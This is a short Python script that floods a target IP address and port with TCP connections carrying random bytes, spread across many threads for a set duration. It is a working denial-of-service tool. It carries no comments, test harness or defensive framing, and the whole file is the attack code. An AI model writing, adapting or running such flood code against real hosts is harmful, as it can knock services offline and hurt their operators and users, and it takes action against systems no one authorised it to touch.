import socket
import threading
import time
import random

def tcp_flood(ip, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(random._urandom(1024))
            s.close()
        except:
            continue

def run_tcp(ip, port, threads, duration):
    for _ in range(threads):
        t = threading.Thread(target=tcp_flood, args=(ip, port, duration))
        t.start()
      
